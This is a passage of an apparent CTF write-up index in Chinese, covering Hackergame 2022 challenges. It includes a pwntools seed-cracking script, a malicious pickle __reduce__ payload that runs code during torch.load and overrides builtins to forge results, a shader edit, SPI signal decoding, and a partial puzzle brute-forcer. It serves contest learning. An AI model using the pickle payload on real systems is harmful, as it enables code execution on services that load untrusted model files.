<p>\u5f53\u7136\uff0c\u8fd9\u662f\u4e00\u4e2a\u6982\u7387\u6027\u7b97\u6cd5\uff0c\u5982\u679c\u60f3\u5f97\u5230\u66f4\u7cbe\u786e\u7684\u503c\uff0c\u5c31\u9700\u8981\u6492\u66f4\u591a\u7684\u70b9\u3002\u7531\u4e8e\u6492\u70b9\u662f\u968f\u673a\u7684\uff0c\u81ea\u7136\u4e5f\u65e0\u6cd5\u9884\u6d4b\u67d0\u6b21\u6492\u70b9\u5b9e\u9a8c\u5f97\u5230\u7684\u7ed3\u679c\u5230\u5e95\u662f\u591a\u5c11\u2014\u2014\u4f46\u771f\u7684\u662f\u8fd9\u6837\u5417\uff1f</p> <p>\u6709\u4f4d\u597d\u4e8b\u4e4b\u5f92\u51b3\u5b9a\u501f\u6b64\u548c\u4f60\u6765\u4e00\u573a\u8f6e\u76d8\u8d4c\uff1a\u6492 40 \u4e07\u4e2a\u70b9\u8ba1\u7b97\u5706\u5468\u7387\uff0c\u800c\u4f60\u9700\u8981\u731c\u6d4b\u5b9e\u9a8c\u7684\u7ed3\u679c\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e\u4e94\u4f4d\u3002\u4e3a\u4e86\u9632\u6b62\u8fd0\u6c14\u592a\u597d\u78b0\u5de7\u731c\u4e2d\uff0c\u4f60\u4eec\u7ea6\u5b9a\u4e94\u5c40\u4e09\u80dc\u3002</p> <p>\u770b\u8d77\u6765\u6ca1\u4ec0\u4e48\u5176\u5b83\u6f0f\u6d1e\uff0c\u4ece\u4f2a\u968f\u673a\u5165\u624b\uff0c\u8bbe\u7f6e\u7684\u968f\u673a\u79cd\u5b50\u4e3a time(0)+clock()\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u65f6\u95f4\u6233\u52a0\u4e0a\u7a0b\u5e8f\u8fd0\u884c\u5230\u6b64\u5904\u7684 ticks \u6570\u3002\u65f6\u95f4\u6233\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff0c\u6ce2\u52a8\u4e0d\u5927\uff0c\u76f4\u63a5\u4f7f\u7528\u8fde\u63a5\u65f6\u7684\u65f6\u95f4\u6233\u5c31\u53ef\u4ee5\u3002clock() \u4f1a\u6709\u8f83\u5927\u6ce2\u52a8\uff0c\u4ece 0 \u5f00\u59cb\u679a\u4e3e\uff0c\u5c06\u5f97\u5230\u7684\u503c\u4f20\u5165\u4e00\u4e2a C \u7a0b\u5e8f\u4e2d\u4f5c\u4e3a\u968f\u673a\u79cd\u5b50\uff0c\u6a21\u62df\u4e00\u4e0b\uff0c\u770b\u4e00\u770b\u524d\u4e24\u4e2a\u662f\u5426\u80fd\u548c\u6b63\u786e\u7ed3\u679c\u5bf9\u4e0a\u3002\u80fd\u5bf9\u4e0a\u5219\u8bf4\u660e\u968f\u673a\u79cd\u5b50\u627e\u5bf9\u4e86\uff0c\u5c06\u540e\u4e09\u4e2a\u7ed3\u679c\u8f93\u56de\u53bb\u5373\u53ef\u5b8c\u6210\u3002</p> <pre><code>import time\nimport subprocess\nfrom tqdm import tqdm\nfrom pwn import *\n\n# p = process('./challenge')\np = remote(\"202.38.93.111\", 10091)\ntoken = \"...\"\np.sendlineafter(b\": \", token.encode())\ntimestamp = int(time.time())\n\ndef crack_seed(res1, res2):\n    for clock in tqdm(range(0, 9000)):\n        seed = timestamp + clock\n        cracker = subprocess.run(\n            [\"./exp\", str(seed)],\n            stdout=subprocess.PIPE,\n        )\n        res = cracker.stdout.decode().strip().split('\\n')\n        if res[0] == str(res1) and res[1] == str(res2):\n            print(seed)\n            return res\n        seed = timestamp - clock\n        cracker = subprocess.run(\n            [\"./exp\", str(seed)],\n            stdout=subprocess.PIPE,\n        )\n        res = cracker.stdout.decode().strip().split('\\n')\n        if res[0] == str(res1) and res[1] == str(res2):\n            print(seed)\n            return res\n    exit(1)\n\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(b'3.14159')\nwin = p.recvline().decode().strip()\nif win == \"\u731c\u5bf9\u4e86\uff01\":\n    res1 = \"3.14159\"\nelse:\n    p.recvuntil(\"\uff1a\".encode(\"utf-8\"))\n    res1 = p.recvline().decode().strip()\n\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(b'3.14159')\nwin = p.recvline().decode().strip()\nif win == \"\u731c\u5bf9\u4e86\uff01\":\n    res2 = \"3.14159\"\nelse:\n    p.recvuntil(\"\uff1a\".encode(\"utf-8\"))\n    res2 = p.recvline().decode().strip()\n\nprint(res2)\nres = crack_seed(res1, res2)\n\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(res[2].encode(\"utf-8\"))\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(res[3].encode(\"utf-8\"))\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(res[4].encode(\"utf-8\"))\np.interactive()\n</code></pre> <p>\u8fd0\u884c\u5f97\u5230 flag\uff1aflag{raNd0m_nUmb34_a1wayS_m4tters_\u2026\u2026}</p> <p>\u54e6\u5bf9\u4e86\uff0c\u6709\u4e00\u4e2a\u5f88\u5751\u7684\u70b9\u662f mac \u4e0a\u7684 gcc \u5176\u5b9e\u662f clang \u7684 alias\uff0c\u800c clang \u548c gcc \u7684\u968f\u673a\u6570\u6709\u533a\u522b\uff0c\u5728 mac \u4e0a\u8dd1\u7684\u8bdd\u5c31\u4e00\u76f4\u7206\u4e0d\u51fa\u6765\u79cd\u5b50\u3002\u5728 Linux \u4e0a\u5c31\u53ef\u4ee5\u4e00\u4e0b\u7206\u51fa\u6765\u3002</p>"}, {"location": "writeups/hackergame2022/#_13", "title": "\u4e8c\u6b21\u5143\u795e\u7ecf\u7f51\u7edc", "text": "<p>\u5929\u51b7\u6781\u4e86\uff0c\u4e0b\u7740\u96ea\uff0c\u53c8\u5feb\u9ed1\u4e86\u3002\u8fd9\u662f\u4e00\u5e74\u7684\u6700\u540e\u4e00\u5929\u2014\u2014\u5927\u5e74\u591c\u3002\u5728\u8fd9\u53c8\u51b7\u53c8\u9ed1\u7684\u665a\u4e0a\uff0c\u4e00\u4e2a\u6ca1\u6709 GPU\u3001\u6ca1\u6709 TPU \u7684\u5c0f\u5973\u5b69\uff0c\u5728\u8857\u4e0a\u7f13\u7f13\u5730\u8d70\u7740\u3002\u5979\u4ece\u5bb6\u91cc\u51fa\u6765\u7684\u65f6\u5019\u8fd8\u5e26\u7740\u6361\u5783\u573e\u6361\u6765\u7684 E3 \u5904\u7406\u5668\uff0c\u4f46\u662f\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u8dd1\u4e0d\u52a8 Stable Diffusion\uff0c\u4e5f\u8dd1\u4e0d\u52a8 NovelAI\u3002\u5979\u4e5f\u60f3\u7528\u81ea\u5df1\u7684\u5904\u7406\u5668\u8bad\u7ec3\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u751f\u6210\u4e00\u4e9b\u4e8c\u6b21\u5143\u7684\u56fe\u7247\u3002</p> <p>\u4e8e\u662f\u5979\u914d\u7f6e\u597d\u4e86 PyTorch 1.9.1\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6781\u5176\u7b80\u5355\u7684\u6a21\u578b\uff0c\u7528\u81ea\u5df1\u6536\u96c6\u7684 10 \u5f20\u4e8c\u6b21\u5143\u56fe\u7247\u548c\u5bf9\u5e94\u7684\u6807\u7b7e\u5f00\u59cb\u4e86\u8bad\u7ec3\u3002</p> <p>\u5979\u5728 CPU \u4e0a\u5f00\u59cb\u4e86\u7b2c\u4e00\u4e2a epoch \u7684\u8bad\u7ec3\uff0closs \u4e00\u76f4\u5728\u4e0b\u964d\uff0c\u8bb8\u591a\u4e8c\u6b21\u5143\u56fe\u7247\u91cd\u53e0\u5728\u4e00\u8d77\uff0c\u5728\u5411\u5979\u7728\u773c\u775b\u3002</p> <p>\u5979\u53c8\u5f00\u59cb\u4e86\u7b2c\u4e8c\u4e2a epoch\uff0closs \u8d8a\u6765\u8d8a\u4f4e\uff0c\u56fe\u7247\u8d8a\u6765\u8d8a\u7cbe\u7f8e\uff0c\u5979\u7684\u773c\u775b\u4e5f\u8d8a\u6765\u8d8a\u7d2f\uff0c\u5979\u7684\u773c\u775b\u5f00\u59cb\u95ed\u4e0a\u4e86\u3002</p> <p>...</p> <p>\u7b2c\u4e8c\u5929\u6e05\u6668\uff0c\u8fd9\u4e2a\u5c0f\u5973\u5b69\u5750\u5728\u5899\u89d2\u91cc\uff0c\u4e24\u816e\u901a\u7ea2\uff0c\u5634\u4e0a\u5e26\u7740\u5fae\u7b11\u3002\u65b0\u5e74\u7684\u592a\u9633\u5347\u8d77\u6765\u4e86\uff0c\u7167\u5728\u5979\u5c0f\u5c0f\u7684\u5c38\u4f53\u4e0a\u3002</p> <p>\u4eba\u4eec\u53d1\u73b0\u5979\u65f6\u624d\u77e5\u9053\uff0c\u5979\u7684\u6a21\u578b\u5728 10 \u5f20\u56fe\u7247\u4e0a\u8fc7\u62df\u5408\u4e86\uff0c\u51e0\u4e4e\u6ca1\u6709\u8bef\u5dee\u3002</p> <p>\uff08\u5b8c\uff09</p> <p>\u542c\u5b8c\u8fd9\u4e2a\u6545\u4e8b\uff0c\u4f60\u4e00\u8138\u7684\u4e0d\u76f8\u4fe1\uff1a\u300c\u8fd9\u4e48\u7b80\u5355\u7684\u6a21\u578b\u600e\u4e48\u53ef\u80fd\u6ca1\u6709\u8bef\u5dee\u5462\uff1f\u300d\uff0c\u4e8e\u662f\u4f60\u5f00\u59cb\u590d\u73b0\u8fd9\u4e2a\u4e8c\u6b21\u5143\u795e\u7ecf\u7f51\u7edc\u3002</p> <p>\u76ee\u6807\u770b\u8d77\u6765\u5c31\u662f\u8ba9\u6a21\u578b\u751f\u6210\u7684\u56fe\u7247\u548c\u9884\u671f\u51e0\u4e4e\u6ca1\u6709\u8bef\u5dee\u3002\u8bd5\u7740\u591a\u8bad\u7ec3\u51e0\u8f6e\uff0c\u8bd5\u56fe\u8fc7\u62df\u5408\uff0c\u8bb0\u5f55\u4e00\u4e0b loss\uff0c\u53d1\u73b0\u964d\u5230 0.001+ \u7684\u65f6\u5019\u5c31\u964d\u4e0d\u4e0b\u53bb\u4e86\uff0c\u800c\u9700\u8981\u7684\u662f 0.0005 </p> <p>\u770b\u8d77\u6765\u4e0d\u53ef\u884c\u3002\u800c\u4e14\u8fd9\u662f\u4e00\u9053 web \u7c7b\u9898\uff0c\u8003\u8651\u7528\u4e00\u4e9b\u624b\u6bb5\u6765\u8ba9\u5b83\u8ba4\u4e3a\u6211\u7684\u8f93\u51fa\u662f\u5b8c\u5168\u6b63\u786e\u7684\u3002</p> <p>\u641c\u7d22\u53ef\u4ee5\u53d1\u73b0\u5b58\u7684 .pt \u6587\u4ef6\u4e2d\u6709\u4f7f\u7528 pickle \u5e8f\u5217\u5316\u5b58\u50a8\u7684 .pkl \u6587\u4ef6\u3002\u800c\u5728\u8bfb\u53d6\u7684\u65f6\u5019\u4e5f\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u4e5f\u5c31\u5b58\u5728\u4e00\u4e2a pickle \u53cd\u5e8f\u5217\u5316\u7684\u6f0f\u6d1e\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u5199\u4e00\u4e2a\u6076\u610f\u7c7b\u7136\u540e\u6253\u5305\u5230 data.pkl \u538b\u7f29\u8fdb .pt \u6587\u4ef6\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\uff0c\u6bd4\u5982\uff1a <pre><code>class Exploit(object):\n    def __reduce__(self):\n        return (os.system, (\"...\", ))\n</code></pre> \u8fd9\u4e2a\u5728\u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\u8fd0\u884c infer.py \u53ef\u4ee5\u6253\u901a\uff0c\u4f46\u8fdc\u7a0b\u5c31\u4e0d\u53ef\u4ee5\u3002\u6240\u4ee5\u53ef\u4ee5\u731c\u6d4b\u8fdc\u7a0b\u5b9e\u9645\u4e0a\u4ece\u5176\u5b83\u6a21\u5757\u4e2d\u8c03\u7528\u4e86 infer \u51fd\u6570\uff0c\u5982\u679c\u6ca1\u6709\u6b63\u5e38\u8fd4\u56de\uff0c\u5219\u4f1a\u62a5\u9519\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f\u8ba9\u6574\u4e2a\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\uff0c\u53ea\u662f\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u3002\u6839\u636e\u6e90\u7801\u53ef\u4ee5\u77e5\u9053\u6700\u7ec8\u4f1a\u5c06\u6a21\u578b\u8f93\u51fa\u7684\u7ed3\u679c\u5b58\u653e\u5728 /tmp/result.json \u4e2d\uff0c\u7136\u540e\u5728\u5176\u5b83\u4f4d\u7f6e\u518d\u8bfb\u53d6\u8fd9\u4e2a\u6587\u4ef6\uff0c\u8fdb\u884c\u5224\u65ad\u3002\u800c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\u5219\u4f1a\u76f4\u63a5\u62a5\u9519\u3002</p> <p>\u6240\u4ee5\u53ef\u4ee5\u5728 reduce \u4e2d\u5c06\u5b8c\u5168\u6b63\u786e\u7684\u7ed3\u679c\u5148\u5199\u5165 /tmp/result.json \u4e2d\u3002\u4f46\u5982\u679c\u8fd9\u65f6\u76f4\u63a5 exit\uff0c\u5219\u540e\u9762\u7a0b\u5e8f\u65e0\u6cd5\u6267\u884c\uff0c\u4f1a\u51fa\u73b0\u62a5\u9519\u3002\u6240\u4ee5\u8fd8\u9700\u8981\u8ba9\u540e\u9762\u5b8c\u5168\u6b63\u5e38\u8fd0\u884c\u3002\u6574\u4e2a infer \u51fd\u6570\u7684\u903b\u8f91\u5927\u6982\u5982\u4e0b\uff1a <pre><code>def infer(pt_file):\n    # ...\n    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)\n    model.load_state_dict(torch.load(pt_file, map_location=\"cpu\"))\n\n    # ... predict\n\n    json.dump({\"gen_imgs_b64\": gen_imgs}, open(\"/tmp/result.json\", \"w\"))\n</code></pre> \u6211\u4eec\u8f93\u5165\u7684 pt \u6587\u4ef6\u4f1a\u5728 torch.load \u4e2d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u65f6\u4f1a\u5199\u5165 /tmp/result.json\u3002\u800c\u540e\u9762\u5bf9\u4e8e\u6211\u4eec\u5199\u5165\u7684\u5a01\u80c1\u5c31\u662f\u8fd8\u4f1a json.dump \u4e00\u6b21\u3002\u6240\u4ee5\u9996\u5148\u9700\u8981\u5c06 json.dump \u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u62b9\u9664\u6389\uff1a<code>__import__('json').dump=lambda x, y: 0</code>\u3002\u4f46\u8fd9\u8fd8\u4e0d\u591f\uff0c\u56e0\u4e3a\u53c2\u6570\u4e2d\u7684 open \u4e5f\u4f1a\u6267\u884c\uff0c\u4ee5 w \u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\u7684\u8bdd\u4f1a\u5148\u76f4\u63a5\u6e05\u7a7a\u6587\u4ef6\uff0c\u6240\u4ee5\u4e5f\u9700\u8981\u62b9\u6389 open \u7684\u4f5c\u7528\u3002\u4e0d\u8fc7\u540e\u9762\u80af\u5b9a\u8fd8\u4f1a\u9700\u8981\u4f7f\u7528 open \u6765\u8bfb\u53d6\u6587\u4ef6\uff0c\u6240\u4ee5\u53ea\u80fd\u62b9\u6389\u5199\u5165\u7684\u90e8\u5206\uff1a<code>__builtins__['_open'] = open; __builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y)</code>\u3002</p> <p>\u8fd9\u6837\u6765\u8bb2\u6211\u4eec\u7684 exp \u5c31\u662f\uff1a <pre><code>class Exploit(object):\n    def __reduce__(self):\n        text = '{\"gen_imgs_b64\": [\"......'\n        return (exec, (f\"open('/tmp/result.json', 'w').write('{text}');\"\n            \"__import__('json').dump=lambda x, y: 0;\"\n            \"__builtins__['_open']=open;\"\n            \"__builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y)\", ))\n</code></pre></p> <p>\u4f46\u4ec5\u5c06\u8fd9\u4e2a\u6253\u5305\u540e\u5f97\u5230\u7684 data.pkl \u76f4\u63a5\u538b\u7f29\u8fdb pt \u6587\u4ef6\u8fd8\u662f\u4e0d\u884c\u3002\u56e0\u4e3a\u6a21\u578b\u5c31\u6ca1\u6cd5\u6b63\u5e38\u8bfb\u53d6\u4e86\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u4e00\u4e9b\u4fee\u6539\u3002</p> <p>pkl \u6587\u4ef6\u5b9e\u9645\u5b58\u50a8\u7684\u662f\u4e00\u4e2a\u6784\u9020\u597d\u7684\u865a\u62df\u673a\u6307\u4ee4\uff0cpickle \u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u6267\u884c\u5b83\u3002\u770b\u6e90\u7801\u53ef\u4ee5\u4e86\u89e3\u5230\u6709\u4e00\u4e2a\u6307\u4ee4 0x2E \u8868\u793a\u4e86\u7ed3\u675f\u8fd4\u56de\u3002\u6240\u4ee5\u76f4\u63a5\u5c06\u751f\u6210\u7684 data.pkl \u672b\u5c3e\u7684 0x2E \u53bb\u6389\uff0c\u7136\u540e\u76f4\u63a5\u63a5\u4e0a\u4e00\u4efd\u6b63\u786e\u7684 data.pkl \u5185\u5bb9\u5373\u53ef\u5b8c\u6210\u6784\u9020\u3002</p> <p>\u6784\u9020\u597d\u540e\u4e0a\u4f20 pt \u6587\u4ef6\uff0c\u5373\u53ef\u8fbe\u5230\u76ee\u6807\u5f97\u5230 flag\uff1aflag{Torch.Load.Is.Dangerous-\u2026\u2026}</p>"}, {"location": "writeups/hackergame2022/#_14", "title": "\u5149\u4e0e\u5f71", "text": "<p>\u5192\u9669\uff0c\u5c31\u8981\u4e0d\u65ad\u5411\u524d\uff01</p> <p>\u5728\u5bc2\u9759\u7684\u795e\u79d8\u661f\u7403\u4e0a\uff0c\u7ee7\u7eed\u524d\u8fdb\uff0c\u63a2\u5bfb flag \u7684\u5965\u79d8\u5427\uff01</p> <p>\u6253\u5f00\u53d1\u73b0\u662f\u4e00\u4e2a WebGL \u6e32\u67d3\u7684\u573a\u666f\uff0c\u5176\u4e2d flag \u7684\u5185\u5bb9\u88ab\u6321\u4f4f\u4e86\u3002\u6240\u6709\u5185\u5bb9\u90fd\u662f\u5728\u524d\u7aef\u7684\uff0c\u5b58\u4e0b\u6765\u5c31\u53ef\u4ee5\u672c\u5730\u8c03\u8bd5\u3002</p> <p>\u53d1\u73b0\u5176\u4e2d\u7684\u4e3b\u8981\u573a\u666f\u6e32\u67d3\u4ee3\u7801\u90fd\u5728 fragment-shader.js \u4e2d\u3002\u53ef\u4ee5\u53d1\u73b0\u7531\u4e00\u4e9b sdf \u7ec4\u6210\uff0c\u6700\u7ec8\u7684\u573a\u666f\u4e5f\u662f\u7531\u51e0\u4e2a sdf \u7ed3\u679c\u53d6 min \u800c\u6765\u7684\u3002</p> <p>\u770b\u8d77\u6765 t5SDF \u7684\u4ee3\u7801\u6700\u77ed\uff0c\u53ef\u80fd\u662f\u65bd\u52a0\u7684\u906e\u76d6\u3002\u6240\u4ee5\u5c06 sceneSDF \u4e2d t5 \u76f8\u5173\u7684\u90e8\u5206\u5220\u6389\uff0c\u518d\u6253\u5f00\u9875\u9762\u8fd0\u884c\u5373\u53ef\u770b\u5230\u5b8c\u6574 flag\uff1aflag{SDF-i3-FuN!}</p> <p></p>"}, {"location": "writeups/hackergame2022/#_15", "title": "\u7247\u4e0a\u7cfb\u7edf", "text": "<p>\u6700\u8fd1\uff0c\u4f60\u542c\u8bf4\u5ba4\u53cb\u5728 SD \u5361\u65b9\u9762\u53d6\u5f97\u4e86\u4e9b\u8fdb\u5c55\u3002\u5728\u4ed6\u65e5\u590d\u4e00\u65e5\u7684\u81ea\u8a00\u81ea\u8bed\u4e2d\uff0c\u4f60\u9010\u6e10\u4e86\u89e3\u5230\u8fd9\u4e2a\u7531\u4ed6\u4e00\u4e2a\u4eba\u81ea\u4e3b\u7814\u53d1\u7684\u7247\u4e0a\u7cfb\u7edf\u73b0\u5728\u5df2\u7ecf\u53ef\u4ee5\u4ece SD \u5361\u542f\u52a8\uff1a\u5148\u7531\u201c\u7247\u4e0a ROM \u4e2d\u7684\u56fa\u4ef6\u201d\u52a0\u8f7d\u5e76\u8fd0\u884c SD \u5361\u7b2c\u4e00\u4e2a\u6247\u533a\u4e2d\u7684\u201c\u5f15\u5bfc\u7a0b\u5e8f\u201d\uff0c\u4e4b\u540e\u7531\u8fd9\u4e2a\u201c\u5f15\u5bfc\u7a0b\u5e8f\u201d\u4ece SD \u5361\u4e2d\u52a0\u8f7d\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u3002\u800c\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u76ee\u524d\u80fd\u505a\u7684\u53ea\u662f\u5411\u201c\u4e32\u53e3\u201d\u8f93\u51fa\u4e00\u4e9b\u5b57\u7b26\u3002</p> <p>\u540c\u65f6\u4f60\u542c\u8bf4\uff0c\u8fd9\u4e2a\u5e76\u4e0d\u5b8c\u5584\u7684 SD \u5361\u9a71\u52a8\u53ea\u4f7f\u7528\u4e86 SD \u5361\u7684 SPI \u6a21\u5f0f\uff0c\u800c\u4f20\u8f93\u901f\u5ea6\u4e5f\u662f\u4f4e\u5f97\u611f\u4eba\u3002\u6b64\u65f6\u4f60\u7a81\u7136\u60f3\u5230\uff1a\u5982\u679c\u901f\u5ea6\u4e0d\u5feb\u7684\u8bdd\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u7528\u903b\u8f91\u5206\u6790\u4eea\u6765\u91c7\u96c6\uff08\u5077\u7a83\uff09\u8fd9\u4e2a SD \u5361\u7684\u4fe1\u53f7\uff0c\u4ece\u800c\u201c\u83b7\u5f97\u201d SD \u5361\u4ee5\u81f3\u4e8e\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u7684\u79d8\u5bc6\uff1f</p> <p>\u4f60\u4ece\u62bd\u5c49\u89d2\u843d\u638f\u51fa\u5403\u7070\u5df2\u4e45\u7684\u903b\u8f91\u5206\u6790\u4eea\u3002\u8fd9\u4e2a\u5c0f\u4e1c\u897f\u4ef7\u683c\u4e0d\u5230 50 \u5757\u94b1\uff0c\u91c7\u6837\u7387\u4e5f\u53ea\u6709 24 M\u3002\u4f60\u6253\u5f00 PulseView\uff0c\u628a\u91c7\u6837\u7387\u8c03\u9ad8\uff0c\u8fde\u4e0a\u5ba4\u53cb\u5f00\u53d1\u677f\u4e0a SD \u5361\u7684\u5f15\u811a\uff0c\u7136\u540e\u63a5\u901a\u4e86\u5f00\u53d1\u677f\u7684\u7535\u6e90\uff0c\u5e0c\u671b\u8fd9\u804a\u80dc\u4e8e\u65e0\u7684\u5206\u6790\u4eea\u771f\u7684\u80fd\u6293\u5230\u70b9\u4ec0\u4e48\u6709\u610f\u601d\u7684\u4fe1\u53f7\u3002\u81f3\u4e8e\u4f60\u4e3a\u4ec0\u4e48\u6ca1\u6709\u76f4\u63a5\u628a SD \u5361\u62ff\u4e0b\u6765\u8bfb\u53d6\u6570\u636e\uff0c\u5c31\u6ca1\u4eba\u77e5\u9053\u4e86\u3002</p> <p>\u5f15\u5bfc\u6247\u533a</p> <p>\u542c\u8bf4\uff0c\u7b2c\u4e00\u4e2a flag \u85cf\u5728 SD \u5361\u7b2c\u4e00\u4e2a\u6247\u533a\u7684\u672b\u5c3e\u3002\u4f60\u80fd\u627e\u5230\u5b83\u5417\uff1f</p> <p>\u64cd\u4f5c\u7cfb\u7edf</p> <p>\u5ba4\u53cb\u7684\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u4f1a\u8f93\u51fa\u4e00\u4e9b\u8c03\u8bd5\u4fe1\u606f\u548c\u7b2c\u4e8c\u4e2a flag\u3002\u4ece\u5ba4\u53cb\u524d\u4e9b\u65e5\u5b50\u793e\u4ea4\u7f51\u7edc\u53d1\u5e03\u7684\u7ec8\u7aef\u622a\u56fe\u770b\uff0c\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u6bcf\u6b21\u201c\u542f\u52a8\u201d\u90fd\u4f1a\u9996\u5148\u8f93\u51fa\uff1a</p> <p>LED: ON Memory: OK</p> <p>\u6216\u8bb8\u4f60\u53ef\u4ee5\u6839\u636e\u8fd9\u4e00\u90e8\u5206\u56fa\u5b9a\u7684\u8f93\u51fa\u548c\u5f15\u5bfc\u6247\u533a\u7684\u4ee3\u7801\uff0c\u5148\u641e\u6e05\u695a\u90a3\u201c\u4e32\u53e3\u201d\u548c\u201cSD \u5361\u9a71\u52a8\u201d\u5230\u5e95\u662f\u600e\u4e48\u5de5\u4f5c\u7684\uff0c\u4e4b\u540e\u518d\u4ed4\u7ec6\u7814\u7a76 flag \u5230\u5e95\u662f\u4ec0\u4e48\uff0c\u5c31\u50cf\u5f53\u5e74\u7684 Enigma \u4e00\u6837\u3002</p> <p>\u7b2c\u4e00\u90e8\u5206\u76f4\u63a5\u4f7f\u7528 PulseView \u8f6f\u4ef6\u8bfb\u53d6 binary \u6587\u4ef6\uff0c\u5f97\u5230\u4fe1\u53f7\uff0c\u7136\u540e\u6dfb\u52a0 SD card\uff08SPI mode\uff09\u89e3\u7801\u5668\uff0c\u5c06\u51e0\u4e2a\u4fe1\u53f7\u63a5\u4e0a\uff0c\u5c31\u53ef\u4ee5\u5728 MOSI data \u4e2d\u770b\u5230 flag</p> <p></p> <p>dump \u51fa\u6765\u7136\u540e\u8f6c\u6362\u5373\u53ef\u5f97\u5230 flag\uff1aflag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N}</p> <p>\u7b2c\u4e8c\u90e8\u5206\u8bd5\u56fe\u9006\u5411\u540e\u9762\u7684 RISCV \u6307\u4ee4\uff0c\u4f46\u5b8c\u5168\u770b\u4e0d\u51fa\u4ec0\u4e48\u6709\u610f\u4e49\u7684\u4e1c\u897f\uff0c\u6000\u7591\u662f\u6570\u636e\u641e\u9519\u4e86\uff0c\u61d2\u5f97\u4fee\uff0c\u7f62\u4e86\u3002</p>"}, {"location": "writeups/hackergame2022/#_16", "title": "\u4f01\u9e45\u62fc\u76d8", "text": "<p>\u8fd9\u662f\u4e00\u4e2a\u53ef\u7231\u7684\u4f01\u9e45\u6ed1\u5757\u62fc\u76d8\u3002\uff08\u89c9\u5f97\u4e0d\u53ef\u7231\u7684\u540c\u5b66\u53ef\u4ee5\u6362\u53ef\u7231\u7684\u9898\u505a\uff09</p> <p>\u548c\u5e02\u9762\u4e0a\u53ea\u80fd\u6253\u4e71\u4e4b\u540e\u62fc\u56de\u7684\u666e\u901a\u6ed1\u5757\u62fc\u76d8\u4e0d\u540c\uff0c\u8fd9\u4e2a\u62fc\u76d8\u662f\u81ea\u52a8\u6253\u4e71\u62fc\u56de\u7684\u3002\u4e00\u6b21\u6e38\u620f\u53ef\u4ee5\u5e2e\u52a9\u60a8\u4f53\u9a8c\u5230 16/256/4096 \u6b21\u666e\u901a\u62fc\u76d8\u7684\u4e50\u8da3\u3002</p> <p>\u6bcf\u4e00\u6b65\u7684\u6253\u4e71\u7684\u65b9\u5f0f\u6709\u4e24\u79cd\uff0c\u9009\u62e9\u54ea\u4e00\u79cd\u5219\u7531\u60a8\u7684\u8f93\u5165\uff08\u957f\u5ea6\u4e3a 4/16/64 \u7684 0/1 \u5e8f\u5217\uff09\u7684\u67d0\u4e00\u4f4d\u51b3\u5b9a\u3002\u5982\u679c\u60a8\u5728\u6700\u540e\u80fd\u6210\u529f\u6253\u4e71\u8fd9\u4e2a\u62fc\u76d8\uff0c\u60a8\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 flag \u5566\uff0c\u5feb\u6765\u8bd5\u8bd5\u5427wwwwww</p> <p>\u7b2c\u4e00\u90e8\u5206\u8f93\u5165\u53ea\u6709\u56db\u4e2a bit\uff0c\u76f4\u63a5\u624b\u52a8\u8bd5\u5c31\u80fd\u8bd5\u51fa\u6765\u7b54\u6848\u662f 1000\uff0cflag\uff1aflag{it_works_like_magic_\u2026\u2026}</p> <p>\u7b2c\u4e8c\u90e8\u5206\u8f93\u5165\u6709 16 \u4e2a bit\uff0c\u53ef\u4ee5\u7528\u4ee3\u7801\u7206\u7834\u4e00\u4e0b\uff0c\u5c06\u9898\u7ed9\u4ee3\u7801\u4e2d\u7684\u4e3b\u903b\u8f91\u590d\u5236\u51fa\u6765\uff0c\u679a\u4e3e\u8f93\u5165\u8dd1\u4e00\u4e0b\uff1a <pre><code>import json\nfrom tqdm import tqdm\nfrom sys import argv\n\nclass Board:\n    def __init__(self):\n        self.b = [[i*4+j for j in range(4)] for i in range(4)]\n\n    def _blkpos(self):\n        for i in range(4):\n            for j in range(4):\n                if self.b[i][j] == 15:\n                    return (i, j)\n\n    def reset(self):\n        for i in range(4):\n            for j in range(4):\n                self.b[i][j] = i*4 + j\n\n    def move(self, moves):\n        for m in moves:\n            i, j = self._blkpos()\n            if m == 'L':\n                self.b[i][j] = self.b[i][j-1]\n                self.b[i][j-1] = 15\n            elif m == 'R':\n                self.b[i][j] = self.b[i][j+1]\n                self.b[i][j+1] = 15\n            elif m == 'U':\n                self.b[i][j] = 